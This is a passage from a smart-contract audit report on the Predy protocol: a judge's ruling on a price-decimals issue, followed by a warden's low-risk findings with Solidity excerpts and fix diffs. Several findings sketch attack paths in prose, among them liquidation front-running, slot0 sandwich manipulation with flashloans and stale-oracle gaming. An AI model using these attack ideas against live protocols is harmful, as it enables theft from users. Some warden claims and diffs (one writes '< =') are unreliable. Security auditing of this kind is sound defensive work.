> You can confirm this by the [Uniswap V3/V4](https://docs.uniswap.org/contracts/v4/concepts/managing-positions#squareroot-price-x96) documentation as well as this Stack Overflow thread [here](https://stackoverflow.com/a/74619134) which demonstrates that the live deployment of Uniswap V3 is also decimal agnostic.
> 
> EDIT: As a clarification, this reply is somewhat misleading as the `sqrtPriceX96` does not directly have a concept of decimals but will yield a price ratio between two assets that factors in decimals.

**[syuhei176 (Predy) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2214285213):**
 > I made a mistake.
> I meant to say:
> ```
> sqrtPriceX96 = (60000 * 10**18) * (2**96) / (1 * 10**8)
> ```

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2214600079):**
 > I have revisited the issue with the assistance of @syuhei176 and have concluded that the submission is indeed incorrect. While the `sqrtPriceX96` measurement does not follow a concept of "decimals", it still accommodates them by offsetting the relevant exchange rate. So in case a `1:1` exchange rate between `WBTC` (8 decimals) and `ETH` (18 decimals) was meant to be depicted via a `sqrtPriceX96`, the value would be as follows:
> 
> Note: please see scenario in judge's [original comment](https://github.com/code-423n4/2024-05-predy-findings/issues/22#issuecomment-2214600079).
> 
> As the code does not support a negative decimal offset, it will be impossible to depict certain pair configurations correctly via the `PriceFeed`. I believe a medium risk rating is better suited for this submission as it would infer that certain tokens will not be supported rather than there being an active loss or vulnerability in the system. I have re-instated its state as a satisfactory finding and was unable to find a duplicate within this repository or the validation one that would merit a reward.

**[syuhei176 (Predy) acknowledged](https://github.com/code-423n4/2024-05-predy-findings/issues/22#event-13509722210)**

***

# Low Risk and Non-Critical Issues

For this audit, 4 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-05-predy-findings/issues/259) by **Bauchibred** received the top score from the judge.

*The following wardens also submitted reports: [Rhaydden](https://github.com/code-423n4/2024-05-predy-findings/issues/253), [Sathish9098](https://github.com/code-423n4/2024-05-predy-findings/issues/254), and [ZanyBonzy](https://github.com/code-423n4/2024-05-predy-findings/issues/252).*

## [01] `DecayLib#decay2()` should prevent division by zero

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/orders/DecayLib.sol#L16-L37

```solidity
    function decay2(uint256 startPrice, uint256 endPrice, uint256 decayStartTime, uint256 decayEndTime, uint256 value)
        internal
        pure
        returns (uint256 decayedPrice)
    {
        if (decayEndTime < decayStartTime) {
            revert EndTimeBeforeStartTime();
        } else if (decayEndTime <= value) {
            decayedPrice = endPrice;
        } else if (decayStartTime >= value) {
            decayedPrice = startPrice;
        } else {
            uint256 elapsed = value - decayStartTime;
            uint256 duration = decayEndTime - decayStartTime;

            if (endPrice < startPrice) {
                decayedPrice = startPrice - (startPrice - endPrice) * elapsed / duration;
            } else {
                decayedPrice = startPrice + (endPrice - startPrice) * elapsed / duration;
            }
        }
    }
```

Evidently, in the edge case where `decayEndTime == decayStartTime` this leads to protocol to then have `duration` as `0` making the execution to attempt dividing by `0`.

### Impact

Panic reverts due to division by zero... bad code practise.

### Recommended Mitigation Steps

Consider having the check to revert being non-strict and then maybe change the error message, since it doesn't make sense to even have `decayEndTime == decayStartTime` in the first place, i.e., apply these changes:

```diff
    function decay2(uint256 startPrice, uint256 endPrice, uint256 decayStartTime, uint256 decayEndTime, uint256 value)
        internal
        pure
        returns (uint256 decayedPrice)
    {
-        if (decayEndTime < decayStartTime) {
-            revert EndTimeBeforeStartTime();
+        if (decayEndTime < =decayStartTime) {
+            revert EndTimeBeforeOrEqualToStartTime();
        } else if (decayEndTime <= value) {
            decayedPrice = endPrice;
        } else if (decayStartTime >= value) {
            decayedPrice = startPrice;
        } else {
            uint256 elapsed = value - decayStartTime;
            uint256 duration = decayEndTime - decayStartTime;

            if (endPrice < startPrice) {
                decayedPrice = startPrice - (startPrice - endPrice) * elapsed / duration;
            } else {
                decayedPrice = startPrice + (endPrice - startPrice) * elapsed / duration;
            }
        }
    }
```

## [02] `PriceFeed#getSqrtPrice()` could over/undervalue the quote price leading to wrong liquidation decisions

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PriceFeed.sol#L45-L58

```solidity
    function getSqrtPrice() external view returns (uint256 sqrtPrice) {
        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData();  //@audit
        IPyth.Price memory basePrice = IPyth(_pyth).getPriceNoOlderThan(_priceId, VALID_TIME_PERIOD);

        require(basePrice.expo == -8, "INVALID_EXP");

        require(quoteAnswer > 0 && basePrice.price > 0);

        uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
        price = price * Constants.Q96 / _decimalsDiff;

        sqrtPrice = FixedPointMathLib.sqrt(price);
    }
```

This function returns the square root of the `baseToken` price quoted in `quoteToken`, and this data is queried when [checking if the vault is in danger](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L129) in order to liquidate it, with needing a confirmation via `PositionCalculator.isLiquidatable()`.

The problem, however, is that Chainlink's `latestRoundData` is being queried, but no min/max checks are applied, leading to contracts working with flawed pricing.

> Keep in mind that the `PriceFeed#getSqrtPrice()` function is heavily used within the protocol in multiple core logics from getting the vault's TVL in the Liquidation logic to see if the vault is safe or not.

### Impact

If the prices ever go over the min/max boundary then protocol is going to ingest heavily inflated/deflated pricing data as the prices returned would be wrong.

Considering protocol plans to support a lot of tokens this would to be a problem as multiple tokens would have their source feed's aggregators with this min/max circuit breakers and as such it should be checked for an asset that has it, since this has quite a high impact with a low likelihood, but would be key to note that this has happened before with `LUNA`.

### Recommended Mitigation Steps

Consider attaching the min/max checkers for aggregators that have it and then route the pricing logic to a fallback oracle in the case where the returned prices are at these boundaries.

## [03] Valid liquidations would fail in turbulent situations because the max slippage idea is applied that's 3%

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L39-L119

<details>

```solidity
    function liquidate(
        uint256 vaultId,
        uint256 closeRatio,
        GlobalDataLibrary.GlobalData storage globalData,
        bytes memory settlementData
    ) external returns (IPredyPool.TradeResult memory tradeResult) {
        require(closeRatio > 0 && closeRatio <= 1e18, "ICR");
        DataType.Vault storage vault = globalData.vaults[vaultId];
        DataType.PairStatus storage pairStatus = globalData.pairs[vault.openPosition.pairId];

        // update interest growth
        ApplyInterestLib.applyInterestForToken(globalData.pairs, vault.openPosition.pairId);

        // update rebalance interest growth
        Perp.updateRebalanceInterestGrowth(pairStatus, pairStatus.sqrtAssetStatus);

        // Checks the vault is danger
        (uint256 sqrtOraclePrice, uint256 slippageTolerance) =
            checkVaultIsDanger(pairStatus, vault, globalData.rebalanceFeeGrowthCache);

        IPredyPool.TradeParams memory tradeParams = IPredyPool.TradeParams(
            vault.openPosition.pairId,
            vaultId,
            -vault.openPosition.perp.amount * int256(closeRatio) / 1e18,
            -vault.openPosition.sqrtPerp.amount * int256(closeRatio) / 1e18,
            ""
        );

        tradeResult = Trade.trade(globalData, tradeParams, settlementData);

        vault.margin += tradeResult.fee + tradeResult.payoff.perpPayoff + tradeResult.payoff.sqrtPayoff;

        tradeResult.sqrtTwap = sqrtOraclePrice;

        bool hasPosition;

        (tradeResult.minMargin,, hasPosition,) =
            PositionCalculator.calculateMinMargin(pairStatus, vault, DataType.FeeAmount(0, 0));

        // Check if the price is within the slippage tolerance range to ensure that the price does not become
        // excessively favorable to the liquidator.
        SlippageLib.checkPrice(
            sqrtOraclePrice,
            tradeResult,
            slippageTolerance,
            tradeParams.tradeAmountSqrt == 0 ? 0 : _MAX_ACCEPTABLE_SQRT_PRICE_RANGE//@audit
        );

        uint256 sentMarginAmount = 0;

        if (!hasPosition) {
            int256 remainingMargin = vault.margin;

            if (remainingMargin > 0) {
                if (vault.recipient != address(0)) {
                    // Send the remaining margin to the recipient.
                    vault.margin = 0;

                    sentMarginAmount = uint256(remainingMargin);

                    ERC20(pairStatus.quotePool.token).safeTransfer(vault.recipient, sentMarginAmount);
                }
            } else if (remainingMargin < 0) {
                vault.margin = 0;

                // To prevent the liquidator from unfairly profiting through arbitrage trades in the AMM and passing losses onto the protocol,
                // any losses that cannot be covered by the vault must be compensated by the liquidator
                ERC20(pairStatus.quotePool.token).safeTransferFrom(msg.sender, address(this), uint256(-remainingMargin));
            }
        }

        emit PositionLiquidated(
            tradeParams.vaultId,
            tradeParams.pairId,
            tradeParams.tradeAmount,
            tradeParams.tradeAmountSqrt,
            tradeResult.payoff,
            tradeResult.fee,
            sentMarginAmount
        );
    }
```

</details>

This function is used to liquidate a vault that is now in danger as the name suggests and it takes in several parameters, including the vault ID, a close ratio, global data, and settlement data. The issue, however, as hinted with the @audit tag is with the integration of the `_MAX_ACCEPTABLE_SQRT_PRICE_RANGE` [which is hardcoded as 3%](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L27); in a case where this attempt at liquidating validly pushes the price above this limit the transaction erroneously reverts when checking the slippage

### Impact

Borderline medium/low, since this leads to a DOS to liquidations in turbulent situations, which then hints how protocol are allowing themselves more risks.

### Recommended Mitigation Steps

Consider not hardcoding this value so it's settable depending on the current market situation.

## [04] The current `pricefeed.sol` could become completely unavailable

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PriceFeed.sol#L28-L33

```solidity

contract PriceFeed {
    address private immutable _quotePriceFeed;
    address private immutable _pyth;
    uint256 private immutable _decimalsDiff;
    bytes32 private immutable _priceId;
```

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PriceFeed.sol#L45-L58

```solidity
    function getSqrtPrice() external view returns (uint256 sqrtPrice) {
        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData();

        IPyth.Price memory basePrice = IPyth(_pyth).getPriceNoOlderThan(_priceId, VALID_TIME_PERIOD);

        require(basePrice.expo == -8, "INVALID_EXP");

        require(quoteAnswer > 0 && basePrice.price > 0);

        uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
        price = price * Constants.Q96 / _decimalsDiff;

        sqrtPrice = FixedPointMathLib.sqrt(price);
    }
```

We can see that this is how the pricing logic works and this is used throughout the pricing logic present in the codebase for core functionalities like liquidating, etc.

The problem here, however, is that the `feedIds` are hardcoded and have been made immutable, but this is a wrong concept considering the underlying feed address could be changed later on for whatever reasons for example by Chainlink, which would then make this function always revert `     (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData();` since the feed would be considered non-existing. The protocol also understands how this bug logic is problematic which is why in the `AddPairLogic` there is a logic to update feeds [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/AddPairLogic.sol#L112-L117).

```solidity
    function updatePriceOracle(DataType.PairStatus storage _pairStatus, address _priceOracle) external {
        _pairStatus.priceFeed = _priceOracle;

        emit PriceOracleUpdated(_pairStatus.id, _priceOracle);
    }
```

However, since this functionality is absent in `Pricefeed.sol` this means that when an oracle goes down, completely all logics routing through the pricefeed's `getSqrtPrice()` would be permanently DOS'd.

### Impact

Borderline medium/low
Impact here is very high considering even liquidations of vaults in danger now would be impossible. However, considering the likelihood of this is very minimal, I assume it to be a low severity.

### Recommended Mitigation Steps

Consider integrating a similar functionality of updating the feeds as is present in the `AddPairLogic`.

## [05] Liquidations can be stolen from honest users

Protocol integrates a [liquidation mechanism](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L39); however, this is not done in a commit-reveal pattern which then leaves this approach to be able to be stolen by a third party. Normally, this could be via a classic front run, however, since the chains protocol is going to deploy in is optimistic L2 chains then this leaves protocol more to bug ideas like the liquidations being stolen during a re-org or sequencer downtime or even front-rins on slower sequencer ingestion chains.

### Impact

Rewards from liquidations would be stolen from honest users/liquidators.

### Recommended Mitigation Steps

Consider integrating a commit-reveal scheme.

## [06] External queries from `PriceFeed#getSqrtPrice()` should be be wrapped in a try catch

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PriceFeed.sol#L45-L58

```solidity
    function getSqrtPrice() external view returns (uint256 sqrtPrice) {
        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData();  //@audit
        IPyth.Price memory basePrice = IPyth(_pyth).getPriceNoOlderThan(_priceId, VALID_TIME_PERIOD);

        require(basePrice.expo == -8, "INVALID_EXP");

        require(quoteAnswer > 0 && basePrice.price > 0);

        uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
        price = price * Constants.Q96 / _decimalsDiff;

        sqrtPrice = FixedPointMathLib.sqrt(price);
    }
```

This function returns the square root of the `baseToken` price quoted in `quoteToken`, and this data is queried when [checking if the vault is in danger](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L129) in order to liquidate it, with needing a confirmation via `PositionCalculator.isLiquidatable()`.

The problem, however, is that Chainlink's `latestRoundData` is being queried, but this call lacks error handling for the potential failure of ` source.latestRoundData()` which could fail due to the call to `oracle.latestRoundData()`. Note that Chainlink pricefeeds could revert due to whatever reason, i.e., say maintenance or maybe the Chainlink team decide to change the underlying address. Now this omission of not considering this call failing would lead to systemic issues, since calls to this would now revert halting any action that requires this call to succeed.

> Keep in mind that the `PriceFeed#getSqrtPrice()` function is heavily used within the protocol in multiple core logics from getting the vault's TVL in the Liquidation logic to see if the vault is safe or not.

### Impact

Borderline medium/low, as this essentially breaks core functionalities like liquidating and whatever requires for the usd value of an asset to be queried since there would be a complete revert.

Considering protocol plans to support a lot of tokens this would to be a problem as multiple tokens would have their source feed's aggregators with this min/max circuit breakers and as such it should be checked for an asset that has it, since this has quite a high impact with a low likelihood, but would be key to note that this has happened before with `LUNA`.

### Recommended Mitigation Steps

Wrap the `.latestRoundData()` call in a try-catch block, then handle the error (e.g., revert with a specific message or use an alternative pricing method). The latter is a better fix as it ensures the protocol still functions as expected on the fallback oracle.

## [07] A user can frontrun liquidations of their unhealthy accounts by liquidating in small portions by themselves

When [liquidating](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L45) there is the idea of a `closefactor` which a liquidator attaches to see how much of the vault they want to liquidate, see [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L39-L45).

```solidity
    function liquidate(
        uint256 vaultId,
        uint256 closeRatio,
        GlobalDataLibrary.GlobalData storage globalData,
        bytes memory settlementData
    ) external returns (IPredyPool.TradeResult memory tradeResult) {
        require(closeRatio > 0 && closeRatio <= 1e18, "ICR");
```

Now this liquidation attempt, doesn't block users themselves from liquidating their own accounts, i.e., `msg.sender` should not be the recipient of the margin of the vault when it gets liquidated. Since this check/logic is not applied, this then allows for a bug flow like the below to be possible:

- A position becomes partially liquidatable _partially here could be as high as 90%_.
- A liquidator passes in the attempt to liquidate this position providing their preferred `closeFactor`.
- Since the owner of the position themselves can pass in a liquidation for their positions.
- They can then frontrun the valid call to `liquidate` with their own liquidation call, albeit in this instance they would be passing in **a very little `closeFactor`** makes the honest call to liquidate to be off.
- Considering the `closeFactor` attached to the liquidate call ends up determining if the vault is liquidatable or not.
- So a _malicious_ user can then skim off the `closeFactor` by doing this to make the end transaction revert.

### Impact

Borderline low/medium, attached as QA considering this needs to logic of frontruns which is not readily available on the L2 chains where protocol is going to be deployed.

### Recommended Mitigation Steps

Consider not allowing the `msg.sender` to liquidate their own positions.

## [08] Trades are being finalized with an easily manipulatable prices which might cause frequent reverts

Take a look at the function that ends up being called whenever there is a need to execute a trade of any kind [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/Trade.sol#L32-L74).

```solidity
    function trade(
        GlobalDataLibrary.GlobalData storage globalData,
        IPredyPool.TradeParams memory tradeParams,
        bytes memory settlementData
    ) external returns (IPredyPool.TradeResult memory tradeResult) {
        DataType.PairStatus storage pairStatus = globalData.pairs[tradeParams.pairId];
        Perp.UserStatus storage openPosition = globalData.vaults[tradeParams.vaultId].openPosition;

        // settle user balance and fee
        DataType.FeeAmount memory realizedFee =
            settleUserBalanceAndFee(pairStatus, globalData.rebalanceFeeGrowthCache, openPosition);

        // calculate required token amounts
        (int256 underlyingAmountForSqrt, int256 stableAmountForSqrt) = Perp.computeRequiredAmounts(
            pairStatus.sqrtAssetStatus, pairStatus.isQuoteZero, openPosition, tradeParams.tradeAmountSqrt
        );

        tradeResult.sqrtPrice = getSqrtPrice(pairStatus.sqrtAssetStatus.uniswapPool, pairStatus.isQuoteZero);//@audit slot0 is used to place trades which is easily manipulatable

        // swap tokens

        SwapStableResult memory swapResult = swap(
            globalData,
            tradeParams.pairId,
            SwapStableResult(-tradeParams.tradeAmount, underlyingAmountForSqrt, realizedFee.feeAmountBase, 0),
            settlementData,
            tradeResult.sqrtPrice,//@audit
            tradeParams.vaultId
        );

        tradeResult.averagePrice = swapResult.averagePrice;

        // add asset or debt
        tradeResult.payoff = Perp.updatePosition(
            pairStatus,
            openPosition,
            Perp.UpdatePerpParams(tradeParams.tradeAmount, swapResult.amountPerp),
            Perp.UpdateSqrtPerpParams(tradeParams.tradeAmountSqrt, swapResult.amountSqrtPerp + stableAmountForSqrt)
        );

        tradeResult.fee = realizedFee.feeAmountQuote + swapResult.fee;
        tradeResult.vaultId = tradeParams.vaultId;
    }
```

Function works fine, the only issue is that it hardcodes the use of `slot0` when choosing the price that the swap gets finalized on.

Going to the implementation of `getSqrtPrice` we can see that it ends up querying the `UniHelper.getSqrtPrice` [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/Trade.sol#L112-L114).

```solidity
    function getSqrtPrice(address uniswapPoolAddress, bool isQuoteZero) internal view returns (uint256 sqrtPriceX96) {
        return UniHelper.convertSqrtPrice(UniHelper.getSqrtPrice(uniswapPoolAddress), isQuoteZero);
    }
```

Now going to the implementation of `UniHelper.getSqrtPrice` we can see that the price data that is returned from is the from `slot0` [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/UniHelper.sol#L13-L16).

```solidity
    function getSqrtPrice(address uniswapPoolAddress) internal view returns (uint160 sqrtPrice) {
        (sqrtPrice,,,,,,) = IUniswapV3Pool(uniswapPoolAddress).slot0();
    }
```

This showcases that at the end of the day trades executions are being done with the price from `slot0`. Now `Uniswap.slot0` is the most recent data point and can be manipulated easily via MEV bots and Flashloans with sandwich attacks; which can cause the loss of funds or leak of value to protocol when users are interacting with this function. This showcases how trades that end up being executed by this could be affected especially when non-tech savvy users are integrating it.

### Impact

QA, I assume users should be tech-savvy enough to place slippages around their trades, to ensure there is a revert in case the price used goes out of their accepted bounds. However, in the case where they don't apply a good enough slippage, their assets could be skimmed off.

### Recommended Mitigation Steps

Reconsider the logic.

## [09] A filler can front/back run the execution of a trade to immediately liquidate a user

Whenever a trade is placed, in short to pass the order to a filler, the trader is required to sign the order and passes the order and signature to the filler. After which the filler calls `executeOrderV3` or `executeTrade()`.

Now would be key to note that, for some trades prices are required from Pyth; however, protocol does not enforce that the prices are updated before being integrated.

This then allows for a filler to:

- Take a signed trade,
- Execute the trade using stale prices.
- Back run the tx to game the execution.
- That is in the case the position is liquidatable with either of the pricing, the filler can just route their logic to ensure they make the most gain from the executions.

This is because the pythprice is not updated when placing the trade and since pyth prices can be queried twice in a block the fillers can just front/back run the tx and liquidate a user.

Would be key to note that asides the price data being manually updated, Pyth oracles also allows for the reading of two different prices in the same transaction which could be used as an avenue for heavy arbitraging. This is because the Pyth network is constantly updating the latest price (every 400ms), so when a new price is submitted on-chain it is not necessary that the price is the latest one. Otherwise, the process of querying the data off-chain, building the transaction, and submitting it on-chain would be required to be done with a latency of less than 400ms; which is not feasible. 

This makes it possible to submit two different prices in the same transaction and, thus, fetch two different prices in the same transaction, showcasing how the front back running could easily be feasible, putting users at risk.

### Impact

Borderline low/medium. On one hand this means that in the case of liquidations, users could be _unfairly_ liquidated due to the nature of Pyth being able to return two distinct prices in a transaction. On the other hand, this seems to be like user error, so leaving to judge to upgrade as they see fit.

### Recommended Mitigation Steps

At the very least, all pricing data that are to be ingested from pyth during the execution of a trade should ensure that they query Pyth's `updatePriceFeeds()` function as has been documented [here](https://docs.pyth.network/price-feeds/api-reference/evm/update-price-feeds). Which would then ensure the right prices are being ingested and the chance of having a massive difference even in the case where two different prices are gotten would be minimal, considering the price was updated.

## [10] External queries from `getSqrtPrice()` should be done more accurately

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PriceFeed.sol#L45-L58

```solidity
    function getSqrtPrice() external view returns (uint256 sqrtPrice) {
        (, int256 quoteAnswer,,,) = AggregatorV3Interface(_quotePriceFeed).latestRoundData();  //@audit
        IPyth.Price memory basePrice = IPyth(_pyth).getPriceNoOlderThan(_priceId, VALID_TIME_PERIOD);

        require(basePrice.expo == -8, "INVALID_EXP");

        require(quoteAnswer > 0 && basePrice.price > 0);

        uint256 price = uint256(int256(basePrice.price)) * Constants.Q96 / uint256(quoteAnswer);
        price = price * Constants.Q96 / _decimalsDiff;

        sqrtPrice = FixedPointMathLib.sqrt(price);
    }
```

This function returns the square root of the `baseToken` price quoted in `quoteToken`, and this data is queried when [checking if the vault is in danger](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L129) in order to liquidate it, with needing a confirmation via `PositionCalculator.isLiquidatable()`.

The problem, however, is that Chainlink's `latestRoundData` is being queried, but this call lacks a check to see the amount of decimals the feed has, unlike the ` require(basePrice.expo == -8, "INVALID_EXP");` check applied for the pyth Oracle which ensures that the decimal is indeed `8`.

This then means that in the case where a feed like AMPL/USD is integrated that has a different amount of decimals compared to it's pairs the price calculated is going to be massively inaccurate in our case here it is going to be heavily inflated as the price returned from chainlink is used as the numerator in the operation.

> Keep in mind that the `PriceFeed#getSqrtPrice()` function is heavily used within the protocol in multiple core logics from getting the vault's TVL in the Liquidation logic to see if the vault is safe or not.

### Impact

Seems to be QA considering one would assume the protocol to do all the vetting before integrating a pricefeed.

### Recommended Mitigation Steps

Consider calling `AggregatorV3Interface.decimals()` to get the exact number of decimals for the price feed being called.

## [11] Valid pairs seem to wrongly invalidated

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/types/GlobalData.sol#L26-L32

```solidity
    function validateVaultId(GlobalDataLibrary.GlobalData storage globalData, uint256 vaultId) internal view {
        if (vaultId <= 0 || globalData.vaultCount <= vaultId) revert IPredyPool.InvalidPairId();
    }

    function validate(GlobalDataLibrary.GlobalData storage globalData, uint256 pairId) internal view {
        if (pairId <= 0 || globalData.pairsCount <= pairId) revert IPredyPool.InvalidPairId();//@audit
    }
```

These functions are used to validate the `vaultIds` or `pairIds`. The issue, however, is that these functions use a non-strict check when doing this validation, which then leads to the validations to fail when the pair/vault Id is the freshest of the bunch, i.e., we expect the last pair to be `globalData.pairsCount` and the last `vaultId` to be equal to `globalData.vaultCount`, but currently passing in these values would cause an invalidation of them.

### Impact

Intended functionality seems to be broken as Ids that are valid are perceived as invalid for both the vaults and the pairs.

### Recommended Mitigation Steps

Consider making the checks strict:

```diff
    function validateVaultId(GlobalDataLibrary.GlobalData storage globalData, uint256 vaultId) internal view {
-        if (vaultId <= 0 || globalData.vaultCount <= vaultId) revert IPredyPool.InvalidPairId();
+        if (vaultId <= 0 || globalData.vaultCount < vaultId) revert IPredyPool.InvalidPairId();
    }

    function validate(GlobalDataLibrary.GlobalData storage globalData, uint256 pairId) internal view {
-        if (pairId <= 0 || globalData.pairsCount <= pairId) revert IPredyPool.InvalidPairId();
+        if (pairId <= 0 || globalData.pairsCount < pairId) revert IPredyPool.InvalidPairId();
    }
```

## [12] Users could be liquidated in the next block

Protocol integrates a [liquidation mechanism](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/logic/LiquidationLogic.sol#L39); however, this logic does not include any buffer whatsoever. Now, users are allowed to borrow with a condition where `liquidatable state == to the liquidating threshold`, which would mean that they could be liquidatable immediately in the next block.

More info on this bug case can be seen [here](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/issues/1038), otherwise [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/363).

### Impact

Users could unfairly be liquidated in the next block.

### Recommended Mitigation Steps

Consider when creating a position to always have a gap between the `user's liquidatable sstate` and ` their liquidating threshold`. This way, we can ensure they are not immediately liquidated in the next block.

## [13] Implement better naming conventions to codes and fix typos

Multiple instances across code, for example: [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/math/LPMath.sol#L30-L66).

```solidity
    function calculateAmount0ForLiquidity(
        uint160 sqrtRatioA,
        uint160 sqrtRatioB,
        uint256 liquidityAmount,
        bool isRoundUp
    ) internal pure returns (int256) {
        if (liquidityAmount == 0 || sqrtRatioA == sqrtRatioB) {
            return 0;
        }

        bool swaped = sqrtRatioA > sqrtRatioB;//@audit

        if (sqrtRatioA > sqrtRatioB) (sqrtRatioA, sqrtRatioB) = (sqrtRatioB, sqrtRatioA);

        int256 r;

        bool _isRoundUp = swaped ? !isRoundUp : isRoundUp;
        uint256 numerator = liquidityAmount;

        if (_isRoundUp) {
            uint256 r0 = FullMath.mulDivRoundingUp(numerator, FixedPoint96.Q96, sqrtRatioA);
            uint256 r1 = FullMath.mulDiv(numerator, FixedPoint96.Q96, sqrtRatioB);

            r = SafeCast.toInt256(r0) - SafeCast.toInt256(r1);
        } else {
            uint256 r0 = FullMath.mulDiv(numerator, FixedPoint96.Q96, sqrtRatioA);
            uint256 r1 = FullMath.mulDivRoundingUp(numerator, FixedPoint96.Q96, sqrtRatioB);

            r = SafeCast.toInt256(r0) - SafeCast.toInt256(r1);
        }

        if (swaped) {
            return -r;
        } else {
            return r;
        }
    }
```

As hinted by the @audit tag, this function uses a `swapped` bool value; however, this should instead be `swap**P**ed`.

Another instance is the below where **required** hasn't been rightly spelled, [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/Perp.sol#L421-L439):

```solidity

    /**
     * @notice Computes reuired amounts to increase or decrease sqrt positions.
     * (L/sqrt{x}, L * sqrt{x})
     */
    function computeRequiredAmounts(
        SqrtPerpAssetStatus storage _sqrtAssetStatus,
        bool _isQuoteZero,
        UserStatus memory _userStatus,
        int256 _tradeSqrtAmount
    ) internal returns (int256 requiredAmountUnderlying, int256 requiredAmountStable) {
        if (_tradeSqrtAmount == 0) {
            return (0, 0);
        }

        if (!Reallocation.isInRange(_sqrtAssetStatus)) {
            revert OutOfRangeError();
        }
```

### Impact

Bad naming conventions, hard to understand code.

### Recommended Mitigation Steps

Consider applying these fixes [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/libraries/math/LPMath.sol#L30-L66).

```diff
    function calculateAmount0ForLiquidity(
        uint160 sqrtRatioA,
        uint160 sqrtRatioB,
        uint256 liquidityAmount,
        bool isRoundUp
    ) internal pure returns (int256) {
        if (liquidityAmount == 0 || sqrtRatioA == sqrtRatioB) {
            return 0;
        }

-        bool swaped = sqrtRatioA > sqrtRatioB;
+        bool swapped = sqrtRatioA > sqrtRatioB;

        if (sqrtRatioA > sqrtRatioB) (sqrtRatioA, sqrtRatioB) = (sqrtRatioB, sqrtRatioA);

        int256 r;

-        bool _isRoundUp = swaped ? !isRoundUp : isRoundUp;
+        bool _isRoundUp = swapped ? !isRoundUp : isRoundUp;
        uint256 numerator = liquidityAmount;

        if (_isRoundUp) {
            uint256 r0 = FullMath.mulDivRoundingUp(numerator, FixedPoint96.Q96, sqrtRatioA);
            uint256 r1 = FullMath.mulDiv(numerator, FixedPoint96.Q96, sqrtRatioB);

            r = SafeCast.toInt256(r0) - SafeCast.toInt256(r1);
        } else {
            uint256 r0 = FullMath.mulDiv(numerator, FixedPoint96.Q96, sqrtRatioA);
            uint256 r1 = FullMath.mulDivRoundingUp(numerator, FixedPoint96.Q96, sqrtRatioB);

            r = SafeCast.toInt256(r0) - SafeCast.toInt256(r1);
        }

-        if (swaped) {
+        if (swapped) {
            return -r;
        } else {
            return r;
        }
    }
```

## [14] `PredyPool#uniswapV3MintCallback()` is potentially vulnerable to some attacks

https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PredyPool.sol#L77-L91

```solidity

    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata) external override {
        // Only the uniswap pool has access to this function.
        require(allowedUniswapPools[msg.sender]);

        IUniswapV3Pool uniswapPool = IUniswapV3Pool(msg.sender);

        if (amount0 > 0) {
            ERC20(uniswapPool.token0()).safeTransfer(msg.sender, amount0);
        }
        if (amount1 > 0) {
            ERC20(uniswapPool.token1()).safeTransfer(msg.sender, amount1);
        }
    }
```

Now, the only verification that's applied to this address is the fact that it's been validated under this mapping [here](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PredyPool.sol#L38).

```solidity
    mapping(address => bool) public allowedUniswapPools;
```

